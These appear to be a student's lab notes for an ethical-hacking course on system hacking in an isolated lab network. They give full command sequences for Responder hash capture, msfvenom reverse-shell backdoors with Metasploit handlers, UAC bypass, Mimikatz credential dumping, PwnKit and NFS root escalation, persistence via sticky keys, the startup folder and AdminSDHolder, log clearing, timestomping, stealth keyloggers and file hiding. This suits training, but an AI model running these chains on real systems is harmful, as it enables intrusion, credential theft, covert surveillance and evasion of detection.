footprinting ->  collected open-source information about your organization.
scanning -> collected information about open ports and services, OSes, and any configuration lapses.
enumeration -> collected information about NetBIOS names, shared network resources, policy and password details, users and user groups, routing tables, and audit and service settings.
vulnerability analysis -> collected information about network vulnerabilities, application and service configuration errors, applications installed on the target system, accounts with weak passwords, and files and folders with weak permissions.

System hacking helps to identify vulnerabilities and security flaws in the target system and predict the effectiveness of additional security measures in strengthening and protecting information resources and systems from attack.

## Objective

The objective of this task is to monitor a target system remotely and perform other tasks that include, but are not limited to:

- Bypassing access controls to gain access to the system (such as password cracking and vulnerability exploitation)
- Acquiring the rights of another user or an admin (privilege escalation)
- Creating and maintaining remote access to the system (executing applications such as trojans, spyware, backdoors, and keyloggers)
- Hiding malicious activities and data theft (executing applications such as Rootkits, steganography, etc.)
- Hiding the evidence of compromise (clearing logs)

## Overview of System Hacking

There are four steps in the system hacking:

- **Gaining Access**: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system
- **Escalating Privileges**: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges
- **Maintaining Access**: Maintain high levels of access to perform malicious activities such as executing malicious appications and stealing, hiding, or tampering with sensitive system files

- **Clearing Logs**: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.

## Lab Tasks
**1. Gain access to the system**

**Responder**
"LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OSes that are used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OSes and can be used to extract the password hashes from a user.

Since the awareness of this attack is low, there is a good chance of acquiring user credentials in an internal network penetration test. By listening for LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim’s user-credentials by using a tool such as Responder.py."
Use the Responder tool to extract information such as the target system’s OS version, client version, NTLM client IP address, and NTLM username and password hash.

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.
- Perform active online attack to crack the system’s password using **Responder**
-ifconfig
**-I**: specifies the interface (here, **ens3**).
[parrot]

	cd Responder
	chmod +x ./Responder.py
	ifconfig
	sudo ./Responder.py -I ens3
	./Responder.py -I eth0 -wrf
	
	[Windows 11]
	Login: jason/querty
	start right click and Run
	\\CEH-Tools

	[Parrot]
	Started fetching NTLM details
	it will also store logs in \home\ubuntu\Responder\logs\SMB-NTLM.. file...

Cracking NTLM Hash using John-The-Ripper
-John the Ripper is a free, open-source password cracking and recovery security auditing tool available for most operating systems.

You need to crack the password --> john the ripper

	sudo snap install john-the-ripper
	sudo john /home/ubuntu/Responder/logs/SMP file
It will capture the password for the user

To restrict it to the wordlist mode only, but permitting the use of word mangling rules:

	john --wordlist=password.lst --rules passwd

**Audit system passwords using L0phtCrack**

**- use the **L0phtCrack** tool for auditing the system passwords of machines in the target network and later enhance network security by implementing a strong password policy for any systems with weak passwords.**

[Windows11]

	start the l0phtCrack
	1. Password Auditing wizard
	2. Windows
	3. A remote machine
	4. Host (10.10.1.22/credentials, domain - CEH.com)
	5. Thorough pwd audit 
	6. Generate Report at end of auditing, store result
	7. Run job immediately


**- Find vulnerabilities on exploit sites**
Exploit-DB - search details
**- Exploit client-side vulnerabilities and establish a VNC(Virtual Network Computing) session**

	[parrot]
	sudo su
	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST 10.10.1.13 LPORT 444 -f exe -o /home/attacker/Desktop/Test.exe
	mkdir /var/www/html/share
	chmod -R 755 /var/www/html/share
	chown -R www-data:www-data /var/www/html/share
	cp /home/attacker/Desktop/Test.exe /var/www/html/share
	service apache2 start
	
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST 10.10.1.13
	set LPORT 444
	exploit 

	[windows]
	http://10.10.1.13/share
	download Test.exe
	
	[parrot]
	{Note: If the Meterpreter shell is not automatically connected to the session, type **sessions -i 1**}
	 sysinfo
	upload /root/PowerSploit/Privesc/PowerUp.ps1 -->uploads the PowerSploit file to the target system’s present working directory.

Note: PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service
abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.

	shell
	powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”

Note: Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.

exploit VNC vulnerability to gain remote access

	run vnc
	
-----------

- Gain access to a remote system using Armitage
  [parrot]

  	service start postgresql
  	Start Metasploit framework --> armitage
  	Application -> Exploitation Tools -> Metsploit Framework -> armitage
  	
  	host -> Nmap scan -Intense scan
  	target ->     10.10.1.11
  	Target host should appear on screen
  	
  	From left hand pain:
  	Payload -> windows/meterpreter/meterpreter_reverse_tcp
  	LPORT 444
  	output -> exe 
  	Launch
  	save desktop malicsious.exe
  cmd prompt:

  	chmod -R 755 /var/www/html/share
  	chown -R www-data:www-data /var/www/html/share
  	cp /root/Desktop/malicious.exe /var/www/html/share
  	service start apache2
  	double-click **meterpreter_reverse_tcp**.  -> LPORT 444 output = multi/handler --> Launch

[Windows]

	access that file run
	1 session has started observe in parrot machine
	explore other options

[parrot]

	select window machine rightclick -> meterpreter1->interact->Meterpreter shell
	sysinfo
	select window machine rightclick -> meterpreter1->Explore->Browse files
	Files 1 tab and the present working directory of the target system appear.

**Gain access to a remote system using Ninja Jonin**

	[Windows 11] - attacker
	1. copy Ninja and Jonin on desktop
	2. extract jonin in desktop
	3. extract ninja as TestVersion
	4. update constant.json in config folder of TestVersion
	5. Host - 10.10.1.11
	6. Server - Server22
	7. Archive TestVersion.zip - we need to transfer this to victim machine, copy it to share folder \\CEH-tools
	8. Before that start jonin.exe
	9. Could see connectivity with 22 is started - jonin listener


	[Windows Server 22]
	1. copy TestVersion to Desktop and extract
	2. Run Ninja.exe -> you would see access denied but go to attacker machine
	
	[WIndows 11]
		manage
		click list   
		connect 1  -> [Window Server 22 is connected remotely from Windows 11]
		change ->  [to get command session]
		Enter Type: cmd 
		ipconfig 
		whoami 
		#help
[Functions such as uploading files, downloading files can be performed using Ninja Jonin tool.]

---------
**Lab2: Perform buffer overflow attack to gain access to a remote system**

------
**2. Perform privilege escalation to gain higher privileges

**Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities**
Backdoor Using Metasploit
Crafting Windows executable through MSFVenom

	[parrot]
	sudo su
	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe
-> create a malicious Windows executable file to share to victim

	mkdir /var/www/html/share
	chmod -R 755 /var/www/html/share
	chown -R www-data:www-data /var/www/html/share
	cp /home/attacker/Desktop/Text.exe /var/www/html/share
	service apache2 start

Setting up reverse listener using msfconsole[](#setting-up-reverse-listener-using-msfconsole)

	[parrrot]
	msfconsole -q
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST 10.10.1.13
	set LPORT 444
	exploit/exploit -j -z


	[Windows 11]
	http://10.10.1.13/share
	Download and run the file Text.exe

	[parrot]
	After the exploit is run on the victim machine.
	Type sessions -i 1 (here, **1** is the id number of the session)
	sysinfo
	getuid

Gained access to the target system with normal user privileges, next task is to perform privilege escalation to attain higher-level privileges in the target system.

a]. Use privilege escalation tools (BeRoot), which allow you to run a configuration assessment on a target system to find out information about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as other data. Using this information, you can find a way to further exploit and elevate the privileges on the target system.
[parrot]

copy BeRoot tool from share folder to Desktop
Upload the tool to windows machine via meterpreter

	upload /home/attacker/Desktop/BeRoot/beRoot.exe 
	shell
	Run beRoot.exe
[Note: Windows privileges can be used to escalated privileges. These privileges include SeDebug, SeRestore & SeBackup & SeTakeOwnership, SeTcb & SeCreateToken, SeLoadDriver, and SeImpersonate & SeAssignPrimaryToken. BeRoot lists all available privileges and highlights if you have one of these tokens.]

	exit

b] **Use **GhostPack Seatbelt** tool to gather host information and perform security checks to find insecurities in the target system.**
[parrot]
copy **Seatbelt.exe** from shared folder to Desktop

	upload /home/attacker/Desktop/Seatbelt.exe 
	shell
	Seatbelt.ext -group=system [ To gather information about AMSIProviders, AntiVirus, AppLocker etc.]
	Seatbelt.ext -group=user [To gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.]
	Seatbelt.ext -group=misc [to gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc.]

![[Pasted image 20231110181316.png]]

	 exit

c] **Another method for Privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.**

check our current system privileges by executing the 
		
	meterpreter>run post/windows/gather/smart_hashdump -> Meterpreter session requires admin privileges to perform such actions.
                                                    	
                                                    	getsystem -t 1: Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.

Try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
[Note: In this task, we will bypass **Windows UAC protection** via the FodHelper Registry Key. It is present in Metasploit as a **bypassuac_fodhelper** exploit.]

	babckground  --> moves the current Meterpreter session to the background.
	use exploit/windows/local/bypassuac_fodhelper
	show options --> To know which options you need to configure in the exploit
	set SESSION 1
set payload windows/meterpreter/reverse_tcp
    set LHOST 10.10.1.13
set TARGET 0 -> 0 indicates nothing, but the Exploit Target ID
exploit
the BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine
>getuid
getsystem -t 1 ->switch to elevate privileges
[Note: If the command **getsystem -t 1** does not run successfully, issue the command **getsystem**.]
Check SYSTEM/admin privileges obtained?

	run post/windows/gather/smart_hashdump  -->extracts the NTLM hashes and displays them,
	[Note: You can further crack these password hashes to obtain plaintext passwords.]
	clearev -> to clear the event logs

Successfully escalated privileges by exploiting the Windows 11 machine’s vulnerabilities.

----------

- Task 2: **Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter**

[Windows11]

	create secret.txt, add conetnt "My credit card numer is 3412321312"

[parrot]

	 Create a backdoor file
	 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
Share this file with victim machine(same way)- start apache server

	msfconsole
	use exploit/multi/handler 
	set payload windows/meterperter/reverse_tcp
	set LHOST 10.10.1.13
	show options -> see all params are set properly
	exploit -j -z
	
	[windows 11]	
	http://10.10.1.13/share
	download backdoor.exe, make sure this file is placed at same location as that of secrete file
	run backdoor.exe

	[parrot]
	meterpreter session is started on parrot machine
	sessions -i 1
	sysinfo
	ipconfig
	getuid
	pwd -> To view current working dir, this diff based on where you have stored backdoor.exe
	ls
	cat secret.txt

Change the **MACE** attributes of the **Secret.txt** file.

[Note: While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.
Note: To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.]

	meterpreter>timestomp Secret.txt -v
	timestomp Secret.txt -m “02/11/2018 08:10:03” ->Changes the **Modified** value of the **Secret.txt** file.
	timestomp Secret.txt -v -> Verify
	cd c:/
	search -f [filename] pagefile.sys  -> takes 5 mnts

Have successfully exploited the system, you can perform post-exploitation maneuvers such as key-logging.
[parrot]

	keyscan_start
[Windows 11]
Create a file and writes something
test.txt -> "This is a secrete file.""
[Parrot]

	keyscan_dump 
	idletime
	shell
	dir /a:h ->to retrieve the directory names with hidden attributes.
	sc queryex type=service state=all ->to list all the available services
	netsh firewall show state -->details about specific service
	netsh firewall show config -->To view current firewall settings
	wmic /node:"" product get name,version,vendor
	wmic cpu get  ->to retrieve the processor’s details.
	wmic useraccount get name,sid -> to retrieve login names and SIDs of the users.
	wmic os where Primary='TRUE' reboot -> to reboot the target system.

Observe that the Meterpreter session also dies as soon as you shut down the victim machine.

![[Pasted image 20231110191153.png]]

--------

**Task 3: Escalate privileges by exploiting vulnerability in pkexec(pkexec CVE-2021-4034)

Polkit or Policykit is an authorization API used by programs to elevate permissions and run processes as an elevated user.
In the pkexec.c code, there are parameters that doesn’t handle the calling correctly which ends up in trying to execute environment variables as commands.
Using a proof of concept code to execute the attack on the target system and escalate the privileges from a standard user to a root user.		
[parrot]
user:attacker

	mkdir /tmp/pwnkit
	mv CVE-2021-4043 /tmp/pwnkit/
	cd /tmp/pwnkit/CVE-2021-4043
	make
	./cve-2021-4043
a shell will open

	whoami  -> root access got

-----

**Task 4: Escalate privileges in Linux machine by exploiting misconfigured NFS**
Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted.

[Ubuntu]

	sudo apt-get update
	sudo apt install nfs-kernel-server
	sudo nano /etc/exports
Note: **/etc/exports** file holds a record for each directory that user wants to share within a network machine.

	type /home *(rw,no_root_squash) -> save
Note: **/home *(rw,no_root_squash)** entry shows that **/home** directory is shared and allows the root user on the client to access files and perform **read/write** operations. ***** sign denotes connection from any host machine.
Re-start nfs

	sudo /etc/init.d/nfs-kernel-server restart
	
	[parrot]
	nmap -sV 10.10.1.9 -> We can see that the port 2049 is open and nfs service is running on it.
	sudo apt-get install nfs-common
	showmount -e 10.10.1.9 [We should see that the home directory is mountable.]

If you receive **clnt_create: RPC: Program not registered** error, switch to **Ubuntu** machine:
Restart ubunutu
restart nfs service

	[parrot]
	showmount -e 10.10.1.9 
	should see home directory is mountable.
	mkdir /tmp/nfs
	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
	cd /tmp/nfs
	sudo cp /bin/bash .
	sudo chmod +s bash
	ls -la bash
	sudo df -h -> Shows amount of free disk available
Try to login to target machine

	ssh -i ubuntu 10.10.1.9
	enter pwd
	cd /home
	ls
	./bash -p 
	id      -> get id's of the user
	whoami  -> got root privilages on the target m/c

Install nano editor in target machine so that we can exploit root access

	cp /bin/nano .
	chmod 4777 nano
	ls -la nano
	cd /home
	./nano -p /etc/shadow  -> To open the shadow file from where we can copy the hash of any user
	copy any hash from the file and crack it using john the ripper or hashcat tools, to get the password of desired users.
	ctr+x -> exit
	cat /etc/crontab
	ps -ef
	find /name "**.txt" -ls 2> /dev/null    [view all the .txt files on the system]
	route -n  -> host/network names in numeric form.
	find / -perm -4000 -ls 2> /dev/null [to view the SUID executable binaries.]
--------------------------------
- **Task 5 : Escalate privileges by bypassing UAC and exploiting - Keys**
  Shift key for 5 times. Sticky keys also can be used to obtain unauthenticated, privileged access to the machine.

  [parrot]
  sudo su
  cd -> take you to root dir
  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
  share the file [follow same steps as previously mentioned]
  service apache2 start

  msfconsole
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set lhost 10.10.1.13
  set lport 444
  run

  [windows 11]
  http://10.10.1.13/share
  Run Windows.exe

  [parrot]
  You should see 1 session open
  sysinfo
  getuid
  bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

  background
  search bypassuac
  use exploit/windows/local/bypassuac_fodhelper
  set session 1
  show options
  set LHOST 10.10.1.13
  set TARGET 0
  exploit

  BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine.
  getsystem -t 1 [To elevate privileges]
  getuid
  background

Using Sticky keys exploit

	...fodhelper>use post/windows/manage/sticky_keys
	sessoins i*    -> list sessions
	set session 2  -> to set privileged session as the current session
	exploit         [IMP]
	
	[windows 11]
	Sign to Martin/apple   -> without admin privileges
	lock the screen
	press Shift key 5 times   -> this will open a command prompt on the lock screen with System privileges instead of sticky keys error window
	whoami
successfully got a persistent System level access to the target system by exploiting sticky keys.

-----------
- **Escalate privileges to gather hashdump using Mimikatz***

Mimikatz is a post exploitation tool that enables users to save and view authentication credentials such as kerberos tickets, dump passwords from memory, PINs, as well as hashes. It enables you to perform functions such as pass-the-hash, pass-the-ticket, and makes post exploitation lateral movement within a network.

[parrot]

	sudo su
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
	share with victim machine
	
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST 10.10.1.13
	set LPORT 444
	run
	
	[windows]
	access run backdoor.exe
	
	[parrot]
	sysinfo
	getuid -> Windows11\Admin
try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
bypassuac_fodhelper -> This module will bypass Windows 10 UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when the Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC flag turned off.

This module modifies a registry key, but cleans up the key once the payload has been invoked.

	background
	use exploit/windows/local/bypassuac_fodhelper
	set session 1
	set LHOST 10.10.1.13
	set TARGET 0
	exploit
	getsystem -t 1
	getuid   --> NT AUTHORITY\SYSTEM
	load kiwi    -->to load mimikatz.
	help kiwi    -->to view all the kiwi commands.
	lsa_dump_sam   ->o load NTLM Hash of all users.
	lsa_dump_secrets -> Note: LSA secrets are used to manage a system's local security policy, and contain sesnsitive data such as User passwords, IE passwords, service 
	account passwords, SQL 
	passwords etc.
Change the password of **Admin** using the **password_change** module.

	password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
	lsa_dump_sam   --> check the new hash value
	
	[Windows 11]
	try to login -> u wont be able to but try with modified pwd, u should be able to login to machine
	
----------

**Lab3: Maintain remote access and hide malicious activities

Maintaining access will help you identify security flaws in the target system and monitor the employees’ computer activities to check for any violation of company security policy. This will also help predict the effectiveness of additional security measures in strengthening and protecting information resources and systems from attack.

**Task 1 :User system monitoring and surveillance using Power Spy**

Power Spy is a computer activity monitoring software that allows you to secretly log all users on a PC while they are unaware. After the software is installed on the PC, you can remotely receive log reports on any device via email or FTP. You can check these reports as soon as you receive them or at any convenient time. You can also directly check logs using the log viewer on the monitored PC.

	[Win server 2022]
	Administrator/Pa$$w0rd	
	Remote desktop connection - 10.10.1.19, show Options, username -> Jason -> connect
    pwd:qwerty  [obtain via Responder + John the ripper]	
	Minimize RDC window

copy Power Spy\setup.exe from shared folder, to Remote desktop connection Desktop folder

	Run setup.exe
Run as admin window appers -> Run

	Enter the pwd test@123 in New Password and confirm Password field -> Submit
	Enter login password test@123
	Register product - later -> to continue
	Powerspy Control pannerl appears	
	Start monitoring -> OK
If System Reboot recommended - Click OK

	Click Stealth Mode [Stealth mode runs Power Spy on the computer completely invisibly.]

Ctr+Alt+X -> to un-hide powerSpy

	Confirm - Yes
	Delete Power Spy installation from Desktop
	Close RDC by clicking close icon.

	[Win Server 2019] -> Legitimate user login
	Jason/qwerty  
	Perform some activity and close -> like open gmail or some website
	Signout user
	
	[Win server 22]
	Launch Remote desktop
	Clt+Alt+X => to bring Power Spy out of Stealth Mode

	OR
	[Note:Search -> Keyboard -> On-Screen Keyboard
		Ctrl - for long time - turn blue - (Alt + X )key]
	
	Run as admin window appears
	Run -> if User Account Control popup appears - Click Yes
	Enter login pwd window appears -> test@123
	Register window --> later
	Power Spy Control Panel --> Stop monitoring
	Application executed -> to check the applications running on the target system
	
	Similarly, you can click on other options such as **Windows Opened**, **Clipboard**, and **Event History** to check other detailed information.
After all activity remove the tool -> uninstall

	Notice -> delete the logs

-------------

- Task 2: User system monitoring and surveillance using Spytech SpyAgent
  Spytech SpyAgent is a powerful piece of computer spy software that allows you to monitor everything users do on a computer—in complete stealth mode. SpyAgent provides a large array of essential computer monitoring features as well as website, application, and chat-client blocking, lockdown scheduling, and the remote delivery of logs via email or FTP.

[Win Ser 22] -> host [Win Ser 19] -> target machine

	[Win 22]	
	RDC -> 10.10.1.19
	User : Jason
	CEH\Jason
	Minimize RDC
	
	Copy Spytech SpyAgent folder from share foldet to Remote desktop machine/Desktop
	click on spyagent(password=spytech)
	Note: If a **User Account Control** pop-up appears, click **Yes**.
	
	Select SpyAgent Installation Type window,select Administrator/Tester
		
	spyagent dialog -> Next
	Would you like to include an uninstaller?; click Yes.

	Spytech SpyAgent dialog box appears; click Continue….
	enter test@123 in New password & confirm pwd
	complete + stealth configuration
	Load on Windows Startup
	Apply section, click Next -> Finish
	SpyAnywhere Cloud Setup window appears, click Skip.
	
	spytech SpyAgent main window appears, along with the Welcome to SpyAgent!
	If a Getting Started dialog box appears, click No.
	
	Main window -> Start monitoring -> pwd (test@123) -> OK
	Note: To bring SpyAgent out of stealth mode, press the Ctrl+Shift+Alt+M keys.
	
	Remove the agent
	close RDC
	
	[Win server 2019]
	Jason/qwerty  -> runnin target machine as legitimate user
	Perform some user activity and logout
	
	[Win 22]
	Open RDC
	Close server manager window
	Note: If a SpyAgent trial version pop-up appears, click continue.
	Note: >If you are unable to bring Power Spy out of Stealth Mode by pressing the Ctrl+Shift+Alt+M keys, then follow below steps:
	Click the **Type here to search** icon at the bottom of **Desktop** and type **Keyboard**. Select **On-Screen Keyboard** from the results.
	On-Screen Keyboard** appears, long click on **Ctrl** key and after it turns blue, select **Shift** key, **Alt** key and **M** key.
	Enter pwd
	spytech SpyAgent -> KEYBOARD & MOUSE
	View Keystroke log
	displays all the resultant keystrokes under the **Keystrokes** **Typed** section
	spytech SpyAgent -> WebSite Logged
	
---------

- Task 3: Hide files using NTFS streams

	[Win server 2019]
	Administrator/Pa$$w0rd
	Ensure C: is NTFS format
	Right click + c: + Properties -> Look for File system : I thould be NTFS
	create folder c:\magic
	copy c:\windows\system32\calc.exe c:\magic\calc.exe
	cmd: cd c:\magic
	notepad readme.txt
	write -> Hellow world! -> save & close
	dir -> check filesize
	type "type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe" -> will hide calc.exe behind readme.txt
	dir -> check filesize -> should not change
	delete calc.exe
	mklink backdoor.exe readme.txt:calc.exe
	backdoor.exe  -> calculator shoudl execute

[Note: For demonstration purposes, we are using the same machine to execute and hide files using NTFS streams. In real-time, attackers may hide malicious files in the target system and keep them invisible from the legitimate users by using NTFS streams, and may remotely execute them whenever required.]
		
---------
- Task 4 : Hide data using white space steganography
  Steganography is the art and science of writing hidden messages in such a way that no one other than the intended recipient knows of the message’s existence.

  Whitespace steganography is used to conceal messages in ASCII text by adding white spaces to the end of the lines. Because spaces and tabs are generally not visible in text viewers, the message is effectively hidden from casual observers. If the built-in encryption is used, the message cannot be read even if it is detected. To perform Whitespace steganography, various steganography tools such as snow are used. Snow is a program that conceals messages in text files by appending tabs and spaces to the end of lines, and that extracts hidden messages from files containing them. The user hides the data in the text file by appending sequences of up to seven spaces, interspersed with tabs.

  [Windows 11]
  Copy snow folder to Desktop
  create a file c:\users\admin\desktop\snow\readme.txt -> same location as snow
  content: [with hiphen]
  hello world!
  ------------
  cmd prompt
  Stego:
  c:\user\admin\desktop\snow\snow.exe> snow -C -m "My Swiss bank accoutn number is 12345678901" -p "magic" readme.txt readme2.txt  [readme2.txt will be created at same location]
  the data (“My Swiss bank account number is 45656684512263”) is hidden inside the readme2.txt file with the contents of readme.txt
  The file readme2.txt has become a combination of readme.txt + My Swiss bank account number is 45656684512263.
  Unstego:
  snow -C -p "magic" readme2.txt
  Open readme2.txt in notepad, Edit -> select All -> will see the hidden data inside readme2.txt
  This is how we can hide the data using whitespace stegnography
---------
- Task 5: Image steganography using OpenStego and StegOnline
  In image steganography, the user hides the information in image files of different formats such as .PNG, .JPG, or .BMP.

**OpenStego**
OpenStego is an image steganography tool that hides data inside images. It is a Java-based application that supports password-based encryption of data for an additional layer of security. It uses the DES algorithm for data encryption, in conjunction with MD5 hashing to derive the DES key from the provided password.
**StegOnline**
StegOnline is a web-based, enhanced and open-source port of StegSolve. It can be used to browse through the 32 bit planes of the image, extract and embed data using LSB steganography techniques and hide images within other image bit planes.

	[Windows2019]
	OpenStego
	Message File section. select \Image Stegnography\OpenStego\NewTextdocument -> contains sensitive info
	Cover File. Select \Image Stegnography\OpenStego\Scenary.jpg -> Open [After stegnography, the message file will be hidden in the designated cover file]
	Click Hide Data button-> success message.
	
	OpenStego
	Extract data -> Input Stego file -> Desktop\Stego.bmp -> Open
	Output folder -> Desktop -> Open
	Click Extract Data button

Note: In real-time, an attacker might scan for images that contain hidden information and use steganography tools to decrypt their hidden information.

**StegOnline** tool

	https://stegonline.georgeom.net/upload
	Stego:
	upload image file -> Z:\....\OpenStego\Island.jpg -> Open
	Image Option page -> Embed Files/Data button -> Row 5 -> Select R, G B -> Select Input Data  -> Text -> type Hello World! -> Go
	Scroll down -> Output section -> Save the image -> Download Extracted Data button -> Save -> Desktop -> Island.png
	
	UnStego:
	Open New tab -> type -> https://stegonline.georgeom.net/upload -> UPLOAD IMAGE -> select Island.png from Desktop -> Open
	Extract Files/Data button
	Extract Data -> Row 5 -> R,G,B
	Result section -> Look for the text
	Note: You can also download the extracted data by clicking the **Download Extracted Data** button.
This concludes the demonstration of how to perform image steganography using OpenStego and StegOnline.

---------
- Task 6: Maintain persistence by abusing boot or logon autostart execution
  The startup folder in Windows contains a list of application shortcuts that are executed when the Windows machine is booted. Injecting a malicious program into the startup folder causes the program to run when a user logins and helps you to maintain persistence or escalate privileges using the misconfigured startup folder.


	[parrot]
	root user
	cd -> go to root dir
	msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=10.10.1.13 LPORT=444 > /home/attacker/Desktop/exploit.exe
	cp /home/attacker/Desktop/exploit.ext /var/www/html/share/   [follow same steps to share folder - mentioned b4]
	service apache2 start
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.1.13
	set lport 444
	run
	
	[windows 11]
	http://10.10.1.13/share, click explghoit.ext -> download -> run
	
	[parrot]
	meterpreter session will be opened
	getuid
try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

	background
	use exploit/windows/local/bypassuac_fodhelper
	set session 1
	show options
	set LHOST 10.10.1.13
	set TARGET 0  [0 - Exploit Target ID]
	exploit
Note: If you get **Exploit completed, but no session was created** message without any session, type **exploit** in the console again and press **Enter**.
The BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine.

	getsystem -t 1  -> to elevate privileges
	getuid 
	cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
	pwd
	create payload that needs to be uploaded into the Startup folder of Windows 11 machine.
	
	Second terminal->
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe
	
	First Terminal
	upload /home/attacker/payload.exe 
	
	[windows 11]
	Login to Admin account -> Restart windows machine
	
	[parrot]
	Open another terminal window with root privilages 
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.1.13
	set lport 8080
	exploit
	
	[windows 11]  login to Admin account and restart the machine so that the malicious file that is placed in the startup folder is executed.
	
	[parrot]
	meterpreter session is open [Note: takes little time to open]
	getuid
Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator.	Thus attacker can maintain persistence on the target machine using misconfigured Startup folder.**End** the lab and re-launch it to reset the machines.
     
---------
- **Task 7: Maintain domain persistence by exploiting Active Directory Objects**

AdminSDHolder is an Active Directory container with the default security permissions, it is used as a template for AD accounts and groups, such as Domain Admins, Enterprise Admins etc. to protect them from unintentional modification of permissions.
If a user account is added into the access control list of AdminSDHolder, the user will acquire "GenericAll" permissions which is equivalent to domain administrators.

	[parrot]
	sudo su
	cd -> root dir
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Exploit.exe
	share the file same as mentioned b4
	cp /home/attacker/Desktop/Exploit.exe /var/www/html/share
	service apache2 start
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.1.13
	set lport 444
	run
	[Windows server 2022]
	Administrator//Pa$$w0rd
	http://10.10.1.13/share download Exploit.exe and run
	[parrot]
	meterpreter session is open
	getuid ->	CEH\Administrator
	upload -r /home/attacker/PowerTools-master c:\\Users\\Administrator\\Downloads  ->upload PowerTools-Master folder to the target system
	shell -> create shell in console
	cd c:\Windows\System32
	powershell --> to launch powershell

As we have access to PowerShell access with admin privileges, we can add a standard user **Martin** in the CEH domain to the **AdminSDHolder** directory and from there to the **Domain Admins** group, to maintain persistence in the domain.

	cd c:\users\administrator\downloads\powerview
	Import-Module ./powerview.psm1
	Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
	Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs  -> Martin now has GenericaALL active directory rights

Normally the changes in ACL will propagate automatically after 60 minutes, we can enter the following command to reduce the time interval of SDProp to 3 minutes.

	REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300

Note: Microsoft doesn’t recommend the modification of this setting, as this might cause performance issues in relation to LSASS process across the domain.

	[Windows server 2022]
	Server Manager
	Tools -> Active Directory Users & Computers
	VIew -> Advanced Features
	Expand CEH.com -> System nodes + Right click on AdminSDHolder -> select Properties -> Security tab -> Can Marin added with full access
will take 3 mints to add user Margin as a member in the directory.

	[parrot] add Martin to Domain Admins group as he is already having all the permissions.
	net group "Domain Admins" Martin /add/domain

	[Windows server 22]
	Active Directory Users and Computers window, click on Users folder right-click on Martin J user name and click on properties.
	Member Of tab -> can see Martin user is successfully added to Domain Admins group
verify if the domain controller is now accessible to the user Martin and domain persistence has been established.

	signout
